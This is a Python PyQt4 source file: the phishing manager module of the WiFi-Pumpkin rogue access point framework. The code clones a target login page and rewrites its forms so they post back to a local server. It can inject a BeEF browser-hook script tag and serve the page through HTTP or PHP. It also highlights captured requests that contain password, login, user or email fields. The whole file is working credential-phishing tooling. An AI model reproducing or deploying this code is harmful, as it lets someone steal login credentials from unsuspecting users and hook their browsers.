from PyQt4.QtGui import *
from PyQt4.QtCore import *
from os import popen,chdir,getcwd
from urllib2 import urlopen,URLError
from BeautifulSoup import BeautifulSoup
from Core.config.Settings import frm_Settings
from Core.Utils import Beef_Hook_url,ThreadPhishingServer
from Modules.servers.ServerHTTP  import ServerThreadHTTP,ServerHandler
"""
Description:
    This program is a module for wifi-pumpkin.py file which includes functionality
    for Phishing attack.

Copyright:
    Copyright (C) 2015 Marcos Nesster P0cl4bs Team
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>
"""
class frm_PhishingManager(QWidget):
    def __init__(self, parent = None):
        super(frm_PhishingManager, self).__init__(parent)
        self.label = QLabel()
        self.Main  = QVBoxLayout(self)
        self.owd   = getcwd()
        self.config = frm_Settings()
        self.setWindowTitle('Phishing Manager')
        self.ThreadTemplates = {'Server':[]}
        self.setGeometry(0, 0, 630, 100)
        self.loadtheme(self.config.XmlThemeSelected())
        self.center()
        self.UI()

    def loadtheme(self,theme):
        sshFile=('Core/%s.qss'%(theme))
        with open(sshFile,"r") as fh:
            self.setStyleSheet(fh.read())

    def center(self):
        frameGm = self.frameGeometry()
        centerPoint = QDesktopWidget().availableGeometry().center()
        frameGm.moveCenter(centerPoint)
        self.move(frameGm.topLeft())

    def StatusServer(self,bool):
        if bool:
            self.statusLabel.setText("[ON]")
            self.statusLabel.setStyleSheet("QLabel {  color : green; }")
        else:
            self.statusLabel.setText("[OFF]")
            self.statusLabel.setStyleSheet("QLabel {  color : red; }")

    def UI(self):
        self.statusBar   = QStatusBar(self)
        self.statusLabel = QLabel('')
        self.statusBar.addWidget(QLabel('Status HTTP Server::'))
        self.StatusServer(False)
        self.statusBar.addWidget(self.statusLabel)
        # left page
        self.frmHtml     = QFormLayout(self)
        self.frmOutput   = QFormLayout(self)

        # right page
        self.frmSettings = QFormLayout(self)
        self.frmCheckBox = QFormLayout(self)
        self.frmClone    = QFormLayout(self)
        self.frmButtons  = QFormLayout(self)
        self.frmright    = QFormLayout(self)
        self.frmleft     = QFormLayout(self)

        #group checkbox
        self.check_custom   = QRadioButton('index.html  ')
        self.check_server   = QRadioButton('Set Directory')
        self.check_beef     = QCheckBox('Enable Beef')
        self.check_clone    = QRadioButton('Website clone')

        # group clone site
        self.cloneLineEdit  = QLineEdit(self)
        self.cloneLineEdit.setText('example.com/login')
        self.cloneLineEdit.setEnabled(False)

        # group Settings
        self.EditBeef       = QLineEdit(self)
        self.EditDirectory  = QLineEdit('/var/www')
        self.txt_redirect   = QLineEdit(self)
        self.BoxPort        = QSpinBox(self)
        self.EditBeef.setEnabled(False)
        self.EditDirectory.setEnabled(False)
        self.BoxPort.setMaximum(65535)
        self.BoxPort.setValue(80)

        # group left
        self.Group_Html  = QGroupBox(self)
        self.Group_List   = QGroupBox(self)
        self.Group_Html.setTitle('index.html:')
        self.Group_List.setTitle('Requests:')

        self.txt_html       = QTextEdit(self)
        self.ListOutputWid  = QListWidget(self)
        self.txt_html.setFixedWidth(450)
        self.frmHtml.addRow(self.txt_html)
        self.frmOutput.addRow(self.ListOutputWid)

        # button stop,start
        self.btn_start_template = QPushButton('Start Server')
        self.btn_stop_template  = QPushButton('Stop Server')
        self.btn_start_template.setIcon(QIcon('rsc/start.png'))
        self.btn_stop_template.setIcon(QIcon('rsc/Stop.png'))
        self.btn_stop_template.setEnabled(False)
        self.btn_start_template.setFixedWidth(110)
        self.btn_stop_template.setFixedWidth(110)
        self.btn_start_template.clicked.connect(self.start_server)

        # group create
        self.GroupSettings  = QGroupBox(self)
        self.GroupCheckBox  = QGroupBox(self)
        self.GroupCloneSite = QGroupBox(self)
        self.GroupSettings.setTitle('Settings:')
        self.GroupCheckBox.setTitle('Modules:')
        self.GroupCloneSite.setTitle('clone:')


        # left layout
        self.txt_html.setPlainText('<html>\n<head>\n<title>WiFi-Pumpkin Phishing </title>'
        '\n</head>\n<body>\n'
        '\n<h3 align=\'center\'>WiFi-Pumpkin Framework</h3>\n'
        '\n<p align=\'center\'>this is demo Attack Redirect.</p>\n'
        '\n</body>\n</html>')
        self.txt_html.setEnabled(False)

        # connect checkbox
        self.check_beef.clicked.connect(self.check_options)
        self.check_custom.clicked.connect(self.check_options)
        self.check_server.clicked.connect(self.check_options)
        self.check_clone.clicked.connect(self.check_options)

        # connect buttons
        self.btn_stop_template.clicked.connect(self.killThread)

        # checkboxs
        self.frmCheckBox.addRow(self.check_custom,self.check_server)
        self.frmCheckBox.addRow(self.check_beef,self.check_clone)
        self.frmCheckBox.addRow(self.GroupSettings)

        # settings
        self.frmSettings.addRow('IP Address:',self.txt_redirect)
        self.frmSettings.addRow('Port:',self.BoxPort)
        self.frmSettings.addRow("Beef Hook URL:",self.EditBeef)
        self.frmSettings.addRow("SetEnv PATH  :",self.EditDirectory)

        # buttons
        self.frmButtons.addRow(self.btn_start_template,self.btn_stop_template)

        # clone
        self.frmClone.addRow(self.cloneLineEdit)

        # page right
        self.GroupCheckBox.setLayout(self.frmCheckBox)
        self.GroupSettings.setLayout(self.frmSettings)
        self.GroupCloneSite.setLayout(self.frmClone)
        self.frmright.addRow(self.GroupCheckBox)
        self.frmright.addRow(self.GroupCloneSite)
        self.frmright.addRow(self.GroupSettings)
        self.frmright.addRow(self.frmButtons)

        # page left
        self.Group_Html.setLayout(self.frmHtml)
        self.Group_List.setLayout(self.frmOutput)
        self.frmleft.addRow(self.Group_Html)
        self.frmleft.addRow(self.Group_List)

        layout = QHBoxLayout(self)
        layout.addLayout(self.frmleft)
        layout.addLayout(self.frmright)

        self.Main.addLayout(layout)
        self.Main.addWidget(self.statusBar)
        self.setLayout(self.Main)

    @pyqtSlot(QModelIndex)
    def check_options(self,index):
        if self.check_custom.isChecked():
            self.txt_html.setEnabled(True)
        else:
            self.txt_html.setEnabled(False)
        if self.check_clone.isChecked():
            self.cloneLineEdit.setEnabled(True)
        else:
            self.cloneLineEdit.setEnabled(False)
        if self.check_beef.isChecked():
            self.EditBeef.setEnabled(True)
        else:
            self.EditBeef.setEnabled(False)
        if self.check_server.isChecked():
            self.EditDirectory.setEnabled(True)
        else:
            self.EditDirectory.setEnabled(False)

    def start_server(self):
        if len(str(self.txt_redirect.text())) == 0:
            return QMessageBox.warning(self,'localhost','Ip Address not found.')
        if self.check_clone.isChecked():
            if len(self.cloneLineEdit.text()) == 0:
                return QMessageBox.warning(self,'Clone','input clone empty')
            site = str(self.cloneLineEdit.text())
            if not str(self.cloneLineEdit.text()).startswith('http://'):
                site = 'http://' + str(self.cloneLineEdit.text())
            if self.checkRequests(site):
                self.ServerHTTPLoad = ServerThreadHTTP(str(self.txt_redirect.text()),
                self.BoxPort.value(),redirect=str(self.cloneLineEdit.text()),
                directory='Templates/Phishing/web_server/index.html')
                self.ThreadTemplates['Server'].append(self.ServerHTTPLoad)
                self.ServerHTTPLoad.requestHTTP.connect(self.ResponseSignal)
                self.btn_start_template.setEnabled(False)
                self.btn_stop_template.setEnabled(True)
                self.ServerHTTPLoad.setObjectName('THread::: HTTP Clone')
                self.ServerHTTPLoad.start()
                self.ServerHTTPLoad.sleep(5)
                a = urlopen('http://{}:{}'.format(str(self.txt_redirect.text()),self.BoxPort.value()))
                if a.getcode() == 200:
                    self.StatusServer(True)
                    self.emit(SIGNAL('Activated( QString )'),'started')

        elif self.check_server.isChecked():
            self.DirectoryPhishing(Path=str(self.EditDirectory.text()))
            self.emit(SIGNAL('Activated( QString )'),'started')

        elif self.check_custom.isChecked():
            self.html = BeautifulSoup(self.txt_html.toPlainText())
            self.CheckHookInjection(self.html,'Templates/Phishing/custom/index.html')
            self.ServerHTTPLoad = ServerThreadHTTP(str(self.txt_redirect.text()),
            self.BoxPort.value(),redirect=str(self.cloneLineEdit.text()),
            directory='Templates/Phishing/custom/index.html')
            self.ThreadTemplates['Server'].append(self.ServerHTTPLoad)
            self.ServerHTTPLoad.requestHTTP.connect(self.ResponseSignal)
            self.btn_start_template.setEnabled(False)
            self.btn_stop_template.setEnabled(True)
            self.ServerHTTPLoad.setObjectName('THread::: HTTP Clone')
            self.ServerHTTPLoad.start()
            self.StatusServer(True)
            self.emit(SIGNAL('Activated( QString )'),'started')

    def DirectoryPhishing(self,Path=None):
        chdir(Path)
        popen('service apache2 stop')
        self.Tphishing = ThreadPhishingServer(['php', '-S','{}:{}'.format(
        str(self.txt_redirect.text()),str(self.BoxPort.value()))])
        self.Tphishing.send.connect(self.ResponseSignal)
        self.Tphishing.setObjectName('Server PHP::'+Path)
        self.ThreadTemplates['Server'].append(self.Tphishing)
        self.Tphishing.start()
        while True:
            if self.Tphishing.process != None:
                chdir(self.owd)
                break
        self.btn_start_template.setEnabled(False)
        self.btn_stop_template.setEnabled(True)
        self.StatusServer(True)

    def ResponseSignal(self,resp):
        form_ = ['pass','login','user','email']
        try:
            newItem = QListWidgetItem(self.ListOutputWid)
            newItem.setText(resp)
            for tag in form_:
                if tag in str(resp).lower():
                    newItem.setTextColor(Qt.green)
                    break
            self.ListOutputWid.addItem(newItem)
            self.ListOutputWid.scrollToBottom()
        except Exception:
            pass

    def checkRequests(self,siteName):
        try:
            html = urlopen(siteName).read()
            request = BeautifulSoup(html)
            try:
                for tag in request.find_all('form'):
                    tag['method'],tag['action'] ='post',''
            except Exception: pass
            self.CheckHookInjection(request,'Templates/Phishing/web_server/index.html')
        except URLError:
            QMessageBox.warning(self,'Request HTTP','It seems like the server is down.')
            return False
        return True

    def cloneWebsite(self):
        if len(self.cloneLineEdit.text()) == 0:
            return QMessageBox.warning(self,'Clone website','input clone empty')
        site = str(self.cloneLineEdit.text())
        if not str(self.cloneLineEdit.text()).startswith('http://'):
            site = 'http://' + str(self.cloneLineEdit.text())
        if self.checkRequests(site):
            self.btn_Clone_page.setText('Cloned')
            return self.btn_Clone_page.setEnabled(False)

    def killThread(self):
        if hasattr(self,'ServerHTTPLoad'): self.ServerHTTPLoad.stop()
        if self.ThreadTemplates['Server'] == []: return
        for thread in self.ThreadTemplates['Server']: thread.stop()
        self.ListOutputWid.clear()
        self.btn_start_template.setEnabled(True)
        self.btn_stop_template.setEnabled(False)
        self.StatusServer(False)

    def CheckHookInjection(self,rasp,Save):
        if self.check_beef.isChecked() and len(self.EditBeef.text()) != 0:
            self.hook = '<script type="text/javascript" src="%s"></script>'%str(self.EditBeef.text())
            html_final = Beef_Hook_url(rasp,self.hook)
            if html_final != None:rasp = html_final
            else: QMessageBox.information(self,'Error Hook Inject Page',
                'Hook Url not injected,not found tag "<body>"')
        with open(Save,'w') as f:
            f.write(str(rasp))
            f.close()
        return rasp